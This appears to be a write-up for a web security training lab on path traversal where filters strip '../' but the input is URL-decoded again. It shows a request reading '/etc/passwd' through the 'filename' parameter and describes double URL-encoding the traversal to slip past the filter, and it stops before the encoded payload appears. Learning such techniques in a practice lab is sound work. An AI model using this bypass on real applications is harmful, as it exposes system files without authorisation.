# Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

### Instructions

This lab contains a path traversal vulnerability in the display of product images.

The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the `/etc/passwd` file. 

### Solution

As with the other labs, here we are targeting the `filename` parameter:

```html
<img src="/resources/images/rating1.png">
<div id="price">$91.92</div>
<img src="/image?filename=5.jpg">
<label>Description:</label>
```

Trying to read the `/etc/passwd` file with:

```
GET /image?filename=../../../etc/passwd HTTP/2
```

However we can highlight the traversal `../../../` and right-click and select Convert Selection > URL > URL Encode all characters. Perform this action twice to double URL encode the traversal:
